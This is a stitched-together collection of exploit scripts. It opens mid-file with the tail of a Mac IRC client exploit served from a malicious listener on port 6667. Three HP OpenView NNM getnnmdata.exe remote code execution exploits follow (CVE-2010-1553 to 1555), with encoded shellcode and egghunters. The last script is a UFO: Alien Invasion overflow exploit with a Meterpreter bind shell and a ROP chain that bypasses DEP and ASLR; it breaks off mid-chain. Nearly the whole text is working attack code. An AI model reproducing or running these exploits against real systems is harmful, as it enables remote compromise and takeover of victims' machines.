"\x5d\xf9\x04\x94\x0f\xab\xe0\x18\xb2\x5a\xad\x91\x51\x36\x5d"
"\xf2\xc3\x95\xed\x9c\x26\x99\x7c\x3b\xeb\xcc\xd2\x73\x61\x3c"
"\x52\x01\x28\xec\x01\xb3\x86\xa0\xb8\xf6\xa7\xb3\x90\x81\x6f"
"\x02\xc2\x12\x84\x64\xb7\x47\x0c\x34\x87\x3d\x7f\x3a\x95\x82"
"\xfc\xc0\x59\x71\xf2\x06\x9e\x29\xa4\x38\x4e\x79\x7f\x74\xee"
"\xe9\x10\xba\xc2\x7c\x18\x73\x5e\xb3\x9a\xf0\xa5\x4b\xef\xe1"
"\x68\x8b\x5f\x66\xa4\x24\x13\x1e\xd2\x15\xb1\xb7\x4c\xe0\xd6"
"\x18\xc1\xa1\x48\x29\xda\x88\xe9\x78\xdd\x42\x63\x99\x8d\x32"
"\x20\x0e\x7e\x02\xc1\x63\xfe\x53\x0e\x2b\xaf\xd3\x43\x4c\x45")

#### Exec Payload From Heap Stub (By Dino Dai Zovi) ####
frag0 = "\x90\x58\x61\xc3"
frag1 = "\x90\x58\x89\xe0\x83\xc0\x0c\x89\x44\x24\x08\xc3"

writeable = 0x8fe66448          # writeable memory location in /usr/lib/dyld
setjmp = 0x8fe1cf38             # t _setjmp in /usr/lib/dyld
strdup = 0x8fe210dc             # t _strdup in /usr/lib/dyld
jmpeax = 0x8fe01041             # jmp eax in /usr/lib/dyld

stub = frag0 + struct.pack('<III',setjmp,writeable+32,writeable) + \
frag1 + 'A' * 20 + struct.pack('<IIIII',setjmp,writeable+24,writeable,strdup,jmpeax) + \
'A' * 4

sploit = "001 :"
sploit += "\x41" * 524
sploit += stub
sploit += shellcode
sploit += "\x0d\x0a"
#sploit = lead

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('', 6667))
s.listen(1)
print ("[*] Listening on port 6667.")
print ("[*] Have someone connect to you.")
print ("[*] Type <control>-c to exit.")
conn, addr = s.accept()
print '[*] Received connection from: ', addr

conn.send(sploit)
conn.close# Exploit Title: HP OpenView NNM getnnmdata.exe CGI Invalid MaxAge Remote Code Execution 
# Date: 2010.07.02
# Author: S2 Crew [Hungary]
# Software Link: hp.com
# Version: 7.53
# Tested on: Windows 2003
# CVE: CVE-2010-1553

# Code :

#!/usr/bin/python

import struct
import socket
import httplib
import urllib

# calc.exe Windows Execute Command
sc2 = (
"\x89\xe7\xdb\xc4\xd9\x77\xf4\x5a\x4a\x4a\x4a\x4a\x4a\x4a\x4a"
"\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x37\x52\x59\x6a\x41"
"\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42"
"\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x4b"
"\x4c\x4a\x48\x4c\x49\x47\x70\x43\x30\x45\x50\x51\x70\x4f\x79"
"\x4d\x35\x50\x31\x4b\x62\x43\x54\x4e\x6b\x51\x42\x46\x50\x4e"
"\x6b\x50\x52\x46\x6c\x4e\x6b\x51\x42\x46\x74\x4c\x4b\x43\x42"
"\x47\x58\x46\x6f\x4f\x47\x42\x6a\x46\x46\x44\x71\x4b\x4f\x44"
"\x71\x4f\x30\x4e\x4c\x47\x4c\x51\x71\x51\x6c\x46\x62\x44\x6c"
"\x45\x70\x4f\x31\x48\x4f\x44\x4d\x47\x71\x4a\x67\x4a\x42\x4c"
"\x30\x43\x62\x46\x37\x4c\x4b\x50\x52\x44\x50\x4c\x4b\x42\x62"
"\x45\x6c\x45\x51\x4e\x30\x4c\x4b\x47\x30\x50\x78\x4e\x65\x4b"
"\x70\x43\x44\x43\x7a\x43\x31\x4a\x70\x46\x30\x4e\x6b\x51\x58"
"\x42\x38\x4c\x4b\x46\x38\x47\x50\x43\x31\x4b\x63\x4b\x53\x47"
"\x4c\x42\x69\x4c\x4b\x45\x64\x4c\x4b\x45\x51\x4a\x76\x46\x51"
"\x4b\x4f\x45\x61\x49\x50\x4c\x6c\x4a\x61\x48\x4f\x44\x4d\x45"
"\x51\x4a\x67\x47\x48\x4b\x50\x44\x35\x4b\x44\x44\x43\x43\x4d"
"\x4a\x58\x47\x4b\x43\x4d\x51\x34\x51\x65\x4d\x32\x42\x78\x4c"
"\x4b\x43\x68\x47\x54\x47\x71\x4a\x73\x51\x76\x4c\x4b\x46\x6c"
"\x50\x4b\x4e\x6b\x42\x78\x45\x4c\x45\x51\x49\x43\x4c\x4b\x47"
"\x74\x4e\x6b\x47\x71\x4e\x30\x4d\x59\x47\x34\x46\x44\x44\x64"
"\x51\x4b\x43\x6b\x50\x61\x42\x79\x42\x7a\x50\x51\x49\x6f\x49"
"\x70\x43\x68\x51\x4f\x51\x4a\x4e\x6b\x45\x42\x4a\x4b\x4d\x56"
"\x43\x6d\x50\x6a\x47\x71\x4c\x4d\x4c\x45\x4e\x59\x45\x50\x45"
"\x50\x45\x50\x50\x50\x43\x58\x45\x61\x4e\x6b\x42\x4f\x4b\x37"
"\x4b\x4f\x4a\x75\x4d\x6b\x4c\x30\x4c\x75\x49\x32\x42\x76\x50"
"\x68\x4d\x76\x4a\x35\x4f\x4d\x4f\x6d\x4b\x4f\x49\x45\x47\x4c"
"\x43\x36\x51\x6c\x45\x5a\x4b\x30\x49\x6b\x4b\x50\x43\x45\x45"
"\x55\x4d\x6b\x42\x67\x47\x63\x51\x62\x42\x4f\x50\x6a\x45\x50"
"\x51\x43\x4b\x4f\x4b\x65\x45\x33\x43\x51\x50\x6c\x45\x33\x46"
"\x4e\x43\x55\x51\x68\x50\x65\x43\x30\x45\x5a\x41\x41"
)

egghunter = (
"\x89\xe1\xda\xd7\xd9\x71\xf4\x5b\x53\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x50\x66\x4f\x71\x4b\x7a\x49\x6f\x46\x6f\x50\x42\x51\x42\x43"
"\x5a\x45\x52\x43\x68\x48\x4d\x46\x4e\x45\x6c\x47\x75\x42\x7a"
"\x44\x34\x48\x6f\x4e\x58\x42\x74\x50\x30\x46\x50\x42\x77\x4c"
"\x4b\x4a\x5a\x4e\x4f\x43\x45\x4a\x4a\x4c\x6f\x43\x45\x4a\x47"
"\x49\x6f\x4b\x57\x41\x41"
)

ret = struct.pack('<L',0x5A667A77) # ppr
jmp = "\x74\x21\x44\x44"

p = 'Topo=X&SnmpLastVal=X&MaxAge='+'A'*2054 + jmp + ret + 'B' * 30 + egghunter

h = {"Content-Type": "application/x-www-form-urlencoded","Host":"172.16.29.149","User-Agent":"T00WT00W"+sc2}

c = httplib.HTTPConnection('172.16.29.149')
c.request("POST","/OvCgi/getnnmdata.exe",p,h)
r = c.getresponse()

print r.status, r.reason
data = r.read()
print data
c.close()

print "\nDone\n" 
# Exploit Title: HP OpenView NNM getnnmdata.exe CGI Invalid ICount Remote Code Execution 
# Date: 2010.07.02
# Author: S2 Crew [Hungary]
# Software Link: hp.com
# Version: 7.53
# Tested on: Windows 2003
# CVE: CVE-2010-1554

# Code :

#!/usr/bin/python

import struct
import socket
import httplib
import urllib

# calc.exe Windows Execute Command
sc2 = (
"\x89\xe7\xdb\xc4\xd9\x77\xf4\x5a\x4a\x4a\x4a\x4a\x4a\x4a\x4a"
"\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x37\x52\x59\x6a\x41"
"\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42"
"\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x4b"
"\x4c\x4a\x48\x4c\x49\x47\x70\x43\x30\x45\x50\x51\x70\x4f\x79"
"\x4d\x35\x50\x31\x4b\x62\x43\x54\x4e\x6b\x51\x42\x46\x50\x4e"
"\x6b\x50\x52\x46\x6c\x4e\x6b\x51\x42\x46\x74\x4c\x4b\x43\x42"
"\x47\x58\x46\x6f\x4f\x47\x42\x6a\x46\x46\x44\x71\x4b\x4f\x44"
"\x71\x4f\x30\x4e\x4c\x47\x4c\x51\x71\x51\x6c\x46\x62\x44\x6c"
"\x45\x70\x4f\x31\x48\x4f\x44\x4d\x47\x71\x4a\x67\x4a\x42\x4c"
"\x30\x43\x62\x46\x37\x4c\x4b\x50\x52\x44\x50\x4c\x4b\x42\x62"
"\x45\x6c\x45\x51\x4e\x30\x4c\x4b\x47\x30\x50\x78\x4e\x65\x4b"
"\x70\x43\x44\x43\x7a\x43\x31\x4a\x70\x46\x30\x4e\x6b\x51\x58"
"\x42\x38\x4c\x4b\x46\x38\x47\x50\x43\x31\x4b\x63\x4b\x53\x47"
"\x4c\x42\x69\x4c\x4b\x45\x64\x4c\x4b\x45\x51\x4a\x76\x46\x51"
"\x4b\x4f\x45\x61\x49\x50\x4c\x6c\x4a\x61\x48\x4f\x44\x4d\x45"
"\x51\x4a\x67\x47\x48\x4b\x50\x44\x35\x4b\x44\x44\x43\x43\x4d"
"\x4a\x58\x47\x4b\x43\x4d\x51\x34\x51\x65\x4d\x32\x42\x78\x4c"
"\x4b\x43\x68\x47\x54\x47\x71\x4a\x73\x51\x76\x4c\x4b\x46\x6c"
"\x50\x4b\x4e\x6b\x42\x78\x45\x4c\x45\x51\x49\x43\x4c\x4b\x47"
"\x74\x4e\x6b\x47\x71\x4e\x30\x4d\x59\x47\x34\x46\x44\x44\x64"
"\x51\x4b\x43\x6b\x50\x61\x42\x79\x42\x7a\x50\x51\x49\x6f\x49"
"\x70\x43\x68\x51\x4f\x51\x4a\x4e\x6b\x45\x42\x4a\x4b\x4d\x56"
"\x43\x6d\x50\x6a\x47\x71\x4c\x4d\x4c\x45\x4e\x59\x45\x50\x45"
"\x50\x45\x50\x50\x50\x43\x58\x45\x61\x4e\x6b\x42\x4f\x4b\x37"
"\x4b\x4f\x4a\x75\x4d\x6b\x4c\x30\x4c\x75\x49\x32\x42\x76\x50"
"\x68\x4d\x76\x4a\x35\x4f\x4d\x4f\x6d\x4b\x4f\x49\x45\x47\x4c"
"\x43\x36\x51\x6c\x45\x5a\x4b\x30\x49\x6b\x4b\x50\x43\x45\x45"
"\x55\x4d\x6b\x42\x67\x47\x63\x51\x62\x42\x4f\x50\x6a\x45\x50"
"\x51\x43\x4b\x4f\x4b\x65\x45\x33\x43\x51\x50\x6c\x45\x33\x46"
"\x4e\x43\x55\x51\x68\x50\x65\x43\x30\x45\x5a\x41\x41"
)

egghunter = (
"\x66\x81\xca\xff\x0f\x42\x52\x6a"
"\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x54\x30\x30\x57\x8b\xfa"
"\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
)

ret = struct.pack('<L',0x5A667A77) # ppr
jmp1 = '\xeb\xf9\x90\x90'
jmp2 = '\xeb\xdd\x90\x90\x90'

p = 'Topo=X&SnmpVals=X&Hostname=X&ICount='+'9'*100+'A'*1917+egghunter+jmp2+jmp1 + ret + "C"*500

h = {"Content-Type": "application/x-www-form-urlencoded","Host":"172.16.29.149","User-Agent":"T00WT00W"+sc2}

c = httplib.HTTPConnection('172.16.29.149')
c.request("POST","/OvCgi/getnnmdata.exe",p,h)
r = c.getresponse()

print r.status, r.reason
data = r.read()
print data
c.close()

print "\nDone\n" 
# Exploit Title: HP OpenView NNM getnnmdata.exe CGI Invalid Hostname Remote Code Execution
# Date: 2010.07.02
# Author: S2 Crew [Hungary]
# Software Link: hp.com
# Version: 7.53
# Tested on: Windows 2003
# CVE: CVE-2010-1555

# Code :

#!/usr/bin/python

import struct
import socket
import httplib
import urllib

eh =(
"\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a"
"\x56\x54\x58\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48"
"\x48\x30\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51"
"\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43"
"\x4a\x4a\x49\x42\x46\x4d\x51\x49\x5a\x4b\x4f\x44\x4f\x50"
"\x42\x46\x32\x42\x4a\x43\x32\x50\x58\x48\x4d\x46\x4e\x47"
"\x4c\x43\x35\x50\x5a\x43\x44\x4a\x4f\x4f\x48\x50\x54\x46"
"\x50\x50\x30\x50\x57\x4c\x4b\x4b\x4a\x4e\x4f\x42\x55\x4b"
"\x5a\x4e\x4f\x44\x35\x4b\x57\x4b\x4f\x4d\x37\x41\x41"
)
# calc.exe Windows Execute Command
sc2 = (
"\x89\xe7\xdb\xc4\xd9\x77\xf4\x5a\x4a\x4a\x4a\x4a\x4a\x4a\x4a"
"\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x37\x52\x59\x6a\x41"
"\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42"
"\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x4b"
"\x4c\x4a\x48\x4c\x49\x47\x70\x43\x30\x45\x50\x51\x70\x4f\x79"
"\x4d\x35\x50\x31\x4b\x62\x43\x54\x4e\x6b\x51\x42\x46\x50\x4e"
"\x6b\x50\x52\x46\x6c\x4e\x6b\x51\x42\x46\x74\x4c\x4b\x43\x42"
"\x47\x58\x46\x6f\x4f\x47\x42\x6a\x46\x46\x44\x71\x4b\x4f\x44"
"\x71\x4f\x30\x4e\x4c\x47\x4c\x51\x71\x51\x6c\x46\x62\x44\x6c"
"\x45\x70\x4f\x31\x48\x4f\x44\x4d\x47\x71\x4a\x67\x4a\x42\x4c"
"\x30\x43\x62\x46\x37\x4c\x4b\x50\x52\x44\x50\x4c\x4b\x42\x62"
"\x45\x6c\x45\x51\x4e\x30\x4c\x4b\x47\x30\x50\x78\x4e\x65\x4b"
"\x70\x43\x44\x43\x7a\x43\x31\x4a\x70\x46\x30\x4e\x6b\x51\x58"
"\x42\x38\x4c\x4b\x46\x38\x47\x50\x43\x31\x4b\x63\x4b\x53\x47"
"\x4c\x42\x69\x4c\x4b\x45\x64\x4c\x4b\x45\x51\x4a\x76\x46\x51"
"\x4b\x4f\x45\x61\x49\x50\x4c\x6c\x4a\x61\x48\x4f\x44\x4d\x45"
"\x51\x4a\x67\x47\x48\x4b\x50\x44\x35\x4b\x44\x44\x43\x43\x4d"
"\x4a\x58\x47\x4b\x43\x4d\x51\x34\x51\x65\x4d\x32\x42\x78\x4c"
"\x4b\x43\x68\x47\x54\x47\x71\x4a\x73\x51\x76\x4c\x4b\x46\x6c"
"\x50\x4b\x4e\x6b\x42\x78\x45\x4c\x45\x51\x49\x43\x4c\x4b\x47"
"\x74\x4e\x6b\x47\x71\x4e\x30\x4d\x59\x47\x34\x46\x44\x44\x64"
"\x51\x4b\x43\x6b\x50\x61\x42\x79\x42\x7a\x50\x51\x49\x6f\x49"
"\x70\x43\x68\x51\x4f\x51\x4a\x4e\x6b\x45\x42\x4a\x4b\x4d\x56"
"\x43\x6d\x50\x6a\x47\x71\x4c\x4d\x4c\x45\x4e\x59\x45\x50\x45"
"\x50\x45\x50\x50\x50\x43\x58\x45\x61\x4e\x6b\x42\x4f\x4b\x37"
"\x4b\x4f\x4a\x75\x4d\x6b\x4c\x30\x4c\x75\x49\x32\x42\x76\x50"
"\x68\x4d\x76\x4a\x35\x4f\x4d\x4f\x6d\x4b\x4f\x49\x45\x47\x4c"
"\x43\x36\x51\x6c\x45\x5a\x4b\x30\x49\x6b\x4b\x50\x43\x45\x45"
"\x55\x4d\x6b\x42\x67\x47\x63\x51\x62\x42\x4f\x50\x6a\x45\x50"
"\x51\x43\x4b\x4f\x4b\x65\x45\x33\x43\x51\x50\x6c\x45\x33\x46"
"\x4e\x43\x55\x51\x68\x50\x65\x43\x30\x45\x5a\x41\x41"
)

ret = struct.pack('<L',0x5A667A77) # ppr
shortjmp = '\x74\x30\x41\x41' # JZ
align = "\x58"*3
asdf = (
"\x2d"
"\x30\x65\x67\x66"
"\x2d"
"\x30\x67\x65\x66"
"\x2d"
"\x30\x33\x33\x33"
)

p = urllib.urlencode({'SnmpLastVal':'A','Topo':'B','Hostname':'A'*2038 + shortjmp + ret + "C"*50+align+asdf+"C"*36+eh+"D"*18000})

h = {"Content-Type": "application/x-www-form-urlencoded","Host":"172.16.29.149","User-Agent":"T00WT00W"+sc2}

c = httplib.HTTPConnection('172.16.29.149')
c.request("POST","/OvCgi/getnnmdata.exe",p,h)
r = c.getresponse()

print r.status, r.reason
data = r.read()
print data
c.close()

print "\nDone\n" 
#!/usr/bin/python
#
# Exploit Title:	UFO: Alien Invasion v2.2.1 BoF Exploit (Win7 ASLR and DEP Bypass)
# Date:			July 5, 2010
# Author:		Node
# Software Link:	http://sourceforge.net/projects/ufoai/files/UFO_AI%202.x/2.2.1/ufoai-2.2.1-win32.exe/download
# Version:		"UFO: Alien Invasion 2.2.1 x86 Apr 28 2008 Win32 RELEASE"
# Tested on:		Windows 7 Ultimate x64 ENG
# CVE :
# Max shellcode size: 	328 bytes
# Badchars: 		'\x00\x0a\x0d'
# Instructions: 	1. DNS spoof/redirect "irc.freenode.org" to your ip
#			2- Have your victim click "Multiplayer" and then "Lobby"
#
# Notes:		There is a possibility that this exploit can work on a different 
#			windows version, by just changing the last bytes of 0xffff34ec 
#			to wherever VirtualProtect() resides in that version of kernel32.dll.


import sys, socket

#msfpayload windows/meterpreter/bind_tcp LPORT=4444 R | msfencode -b '\x00\x0a\x0d' -t c
#[*] x86/shikata_ga_nai succeeded with size 326 (iteration=1)
shellcode = ("\xbf\xb7\x89\xfe\x0e\xda\xd3\xd9\x74\x24\xf4\x2b\xc9\xb1\x4b" +
"\x5e\x83\xc6\x04\x31\x7e\x11\x03\x7e\x11\xe2\x42\x75\x16\x87" +
"\xac\x86\xe7\xf8\x25\x63\xd6\x2a\x51\xe7\x4b\xfb\x12\xa5\x67" +
"\x70\x76\x5e\xf3\xf4\x5e\x51\xb4\xb3\xb8\x5c\x45\x72\x04\x32" +
"\x85\x14\xf8\x49\xda\xf6\xc1\x81\x2f\xf6\x06\xff\xc0\xaa\xdf" +
"\x8b\x73\x5b\x54\xc9\x4f\x5a\xba\x45\xef\x24\xbf\x9a\x84\x9e" +
"\xbe\xca\x35\x94\x88\xf2\x3e\xf2\x28\x02\x92\xe0\x14\x4d\x9f" +
"\xd3\xef\x4c\x49\x2a\x10\x7f\xb5\xe1\x2f\x4f\x38\xfb\x68\x68" +
"\xa3\x8e\x82\x8a\x5e\x89\x51\xf0\x84\x1c\x47\x52\x4e\x86\xa3" +
"\x62\x83\x51\x20\x68\x68\x15\x6e\x6d\x6f\xfa\x05\x89\xe4\xfd" +
"\xc9\x1b\xbe\xd9\xcd\x40\x64\x43\x54\x2d\xcb\x7c\x86\x89\xb4" +
"\xd8\xcd\x38\xa0\x5b\x8c\x54\x05\x56\x2e\xa5\x01\xe1\x5d\x97" +
"\x8e\x59\xc9\x9b\x47\x44\x0e\xdb\x7d\x30\x80\x22\x7e\x41\x89" +
"\xe0\x2a\x11\xa1\xc1\x52\xfa\x31\xed\x86\xad\x61\x41\x79\x0e" +
"\xd1\x21\x29\xe6\x3b\xae\x16\x16\x44\x64\x3f\xe6\x61\xd4\x28" +
"\x0b\x95\xca\xf4\x82\x73\x86\x14\xc3\x2c\x3f\xd7\x30\xe5\xd8" +
"\x28\x13\x5a\x70\xbf\x2b\xb5\x46\xc0\xab\x90\xe4\x6d\x03\x72" +
"\x7f\x7e\x90\x63\x80\xab\xb0\xf4\x17\x21\x51\xb7\x86\x36\x78" +
"\x2d\x49\xa3\x87\xe7\x1e\x5b\x8a\xde\x69\xc4\x75\x35\xe2\xcd" +
"\xe3\xf5\x9d\x31\xe4\xf5\x5d\x64\x6e\xf5\x35\xd0\xca\xa6\x20" +
"\x1f\xc7\xdb\xf8\x8a\xe8\x8d\xad\x1d\x81\x33\x8b\x6a\x0e\xcc" +
"\xfe\x6a\x72\x1b\xc7\xe8\x82\x2e\x2b\x31\x60")



#start
rop = "\x5a\xc9\x70\x61" #0x6170C95A : PUSH ESP # POP EBX # POP EBP
rop += "A"*4
rop += "\xd6\x14\x6c\x68" #0x686C14D6 : ADD ESP,1C
rop += "1111" #VirtualProtect placeholder
rop += "2222" #return address placeholder
rop += "3333" #lpAddress placeholder
rop += "4444" #dwsize placeholder
rop += "5555" #flNewProtect placeholder
rop += "\x05\xe0\x76\x61" #0x6176e005 lpflOldProtect writable in SDL_mixer.dll
rop += "A"*4
rop += "\x45\x57\x10\x68" #0x68105745 : MOV EAX,EBX # POP EBX # POP EBP
rop += "A"*8
rop += "\xdd\x5b\x10\x68" #0x68105BDD : MOV EDX,EAX # MOV EAX,EDX
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX

#grabbing kernel32
rop += "\xb8\x51\x58\x67" #0x675851B8 : MOV EAX,200
rop += "\x71\x33\x6c\x68" #0x686C3371 : MOV ECX,EAX # MOV EAX,ECX
rop += "\xe3\xf9\x71\x61" #0x6171F9E3 : ADD ECX,ECX
rop += "\xe3\xf9\x71\x61" #0x6171F9E3 : ADD ECX,ECX
rop += "\x53\x23\x10\x68" #0x68102353 : XOR EAX,EAX
rop += "\x50\x49\x58\x67" #0x67584950 : ADD EAX,20
rop += "\x50\x49\x58\x67" #0x67584950 : ADD EAX,20
rop += "\x50\x49\x58\x67" #0x67584950 : ADD EAX,20
rop += "\x50\x49\x58\x67" #0x67584950 : ADD EAX,20
rop += "\x50\x49\x58\x67" #0x67584950 : ADD EAX,20 A0
rop += "\x6b\x8c\x13\x68" #0x68138C6B : XCHG EAX,EBP
rop += "\x25\x54\x72\x61" #0x61725425 : ADD ECX,EBP
rop += "\x6b\x8c\x13\x68" #0x68138C6B : XCHG EAX,EBP
rop += "\x50\x49\x58\x67" #0x67584950 : ADD EAX,20
rop += "\x50\x49\x58\x67" #0x67584950 : ADD EAX,20
rop += "\x50\x49\x58\x67" #0x67584950 : ADD EAX,20
rop += "\x6b\x8c\x13\x68" #0x68138C6B : XCHG EAX,EBP
rop += "\x25\x54\x72\x61" #0x61725425 : ADD ECX,EBP 9a0
rop += "\x73\x33\x6c\x68" #0x686C3373 : MOV EAX,ECX
rop += "\x6b\x8c\x13\x68" #0x68138C6B : XCHG EAX,EBP
rop += "\x28\x51\x58\x67" #0x67585128 : MOV EAX,2 
rop += "\x71\x33\x6c\x68" #0x686C3371 : MOV ECX,EAX # MOV EAX,ECX  
rop += "\xe3\xf9\x71\x61" #0x6171F9E3 : ADD ECX,ECX
rop += "\xe3\xf9\x71\x61" #0x6171F9E3 : ADD ECX,ECX
rop += "\xe3\xf9\x71\x61" #0x6171F9E3 : ADD ECX,ECX
rop += "\x6b\x8c\x13\x68" #0x68138C6B : XCHG EAX,EBP
rop += "\x6f\x9f\x58\x67" #0x67589F6F : ADD ECX,EAX # MOVZX EAX,CX
rop += "\x9c\x8d\x59\x67" #0x67598D9C : POP ECX
rop += "\x05\xe0\x76\x61" #0x6176e005 : writable
rop += "\xee\x9b\x71\x61" #0x61719BEE : MOV EBX,EDX # SUB EBX,EAX # MOV EAX,EBX # MOV WORD PTR DS:[ECX+44],AX # ADD ESP,4 # POP EBX # POP EBP
rop += "A"*4
rop += "A"*4
rop += "A"*4
rop += "\x67\x01\x11\x68" #0x68110167 : MOV EAX,DWORD PTR DS:[EAX]  

#VirtualProtect()
rop += "\x71\x33\x6c\x68" #0x686C3371 :  # MOV ECX,EAX # MOV EAX,ECX
rop += "\x5a\xc9\x70\x61" #0x6170C95A :  {POP}  # PUSH ESP # POP EBX # POP EBP
rop += "A"*4 
rop += "\x53\x23\x10\x68" #0x68102353 :  # XOR EAX,EAX 
rop += "\x50\x49\x58\x67" #0x67584950 :  # ADD EAX,20
rop += "\x50\x49\x58\x67" #0x67584950 :  # ADD EAX,20
rop += "\x50\x49\x58\x67" #0x67584950 :  # ADD EAX,20  
rop += "\x6b\x8c\x13\x68" #0x68138C6B :  # XCHG EAX,EBP
rop += "\x6a\x1f\x13\x68" #0x68131F6A :  # ADD EBP,EBX
rop += "\x73\x33\x6c\x68" #0x686C3373 :  # MOV EAX,ECX 
rop += "\x6b\x8c\x13\x68" #0x68138C6B :  # XCHG EAX,EBP
rop += "\x71\x33\x6c\x68" #0x686C3371 :  # MOV ECX,EAX # MOV EAX,ECX
rop += "\x6b\x8c\x13\x68" #0x68138C6B :  # XCHG EAX,EBP
rop += "\xe2\x13\x6c\x68" #0x686C13E2 :  # POP EBX
rop += "\xec\x34\xff\xff" #VirtualProtect() is found at 0x????34ec, if not, change this to match your windows version
rop += "\x42\x35\x80\x70" #0x70803542 :  # XOR AL,AL # POP EBP
rop += "A"*4
rop += "\x02\x4d\x6d\x68" #0x686D4D02 :  # ADD AL,BL
rop += "\x6b\x8c\x13\x68" #0x68138C6B :  # XCHG EAX,EBP
rop += "\x73\x33\x6c\x68" #0x686C3373 :  # MOV EAX,ECX 
rop += "\x6b\x8c\x13\x68" #0x68138C6B :  # XCHG EAX,EBP
rop += "\x71\x33\x6c\x68" #0x686C3371 :  # MOV ECX,EAX # MOV EAX,ECX
rop += "\x34\xa5\x70\x61" #0x6170A534 :  # MOV CH,BH # ADD AL,BYTE PTR DS:[EAX] # MOV ESP,EBP # POP EBP
rop += "A"*4
rop += "A"*4
rop += "A"*4
rop += "A"*4
rop += "\xb9\x4b\x58\x67" #0x67584BB9 : MOV DWORD PTR DS:[EDX],ECX

#fetch shellcode
rop += "\x5a\xc9\x70\x61" #0x6170C95A :  {POP}  # PUSH ESP # POP EBX # POP EBP
rop += "A"*4
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX 
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX 
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX 
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX 
rop += "\x45\x57\x10\x68" #0x68105745 :  {POP}  # MOV EAX,EBX # POP EBX # POP EBP
rop += "A"*4
rop += "A"*4
rop += "\x6b\x8c\x13\x68" #0x68138C6B : XCHG EAX,EBP
rop += "\x53\x23\x10\x68" #0x68102353 : XOR EAX,EAX 
rop += "\xe2\x13\x6c\x68" #0x686C13E2 :  # POP EBX
rop += "\xac\xff\xff\xff" #0xac * 2 = 0x158
rop += "\x02\x4d\x6d\x68" #0x686D4D02 :  # ADD AL,BL
rop += "\x71\x33\x6c\x68" #0x686C3371 : MOV ECX,EAX # MOV EAX,ECX  
rop += "\xe3\xf9\x71\x61" #0x6171F9E3 : ADD ECX,ECX
rop += "\x73\x33\x6c\x68" #0x686C3373 : MOV EAX,ECX
rop += "\x6b\x8c\x13\x68" #0x68138C6B : XCHG EAX,EBP
rop += "\x6f\x9f\x58\x67" #0x67589F6F : ADD ECX,EAX # MOVZX EAX,CX shellcode
rop += "\xb9\x4b\x58\x67" #0x67584BB9 :  # MOV DWORD PTR DS:[EDX],ECX

#again
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX 
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX 
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX 
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX 
rop += "\x73\x33\x6c\x68" #0x686C3373 : MOV EAX,ECX
rop += "\x26\x51\x58\x67" #0x67585126 : MOV DWORD PTR DS:[EDX],EAX # MOV EAX,2 

#set dwsize 0x148 (328)
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX 
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX 
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX 
rop += "\x72\x34\x58\x67" #0x67583472 : INC EDX # DEC EAX 
rop += "\x53\x23\x10\x68" #0x68102353 : XOR EAX,EAX
rop += "\xe2\x13\x6c\x68" #0x686C13E2 :  # POP EBX
rop += "\xa4\xff\xff\xff" #0xa4 * 2 = 0x148 (328)
rop += "\x02\x4d\x6d\x68" #0x686D4D02 :  # ADD AL,BL
rop += "\x71\x33\x6c\x68" #0x686C3371 : MOV ECX,EAX # MOV EAX,ECX  
rop += "\xe3\xf9\x71\x61" #0x6171F9E3 : ADD ECX,ECX
rop += "\x73\x33\x6c\x68" #0x686C3373 : MOV EAX,ECX
rop += "\x26\x51\x58\x67" #0x67585126 : MOV DWORD PTR DS:[EDX],EAX # MOV EAX,2 

#forwardjump
rop += "\x53\x23\x10\x68" #0x68102353 : XOR EAX,EAX 
rop += "\xe2\x13\x6c\x68" #0x686C13E2 :  # POP EBX
rop += "\x70\xff\xff\xff" # 0x70
rop += "\x02\x4d\x6d\x68" #0x686D4D02 :  # ADD AL,BL
rop += "\x5a\xc9\x70\x61" #0x6170C95A :  {POP}  # PUSH ESP # POP EBX # POP EBP
rop += "A"*4
rop += "\x6b\x8c\x13\x68" #0x68138C6B : XCHG EAX,EBP
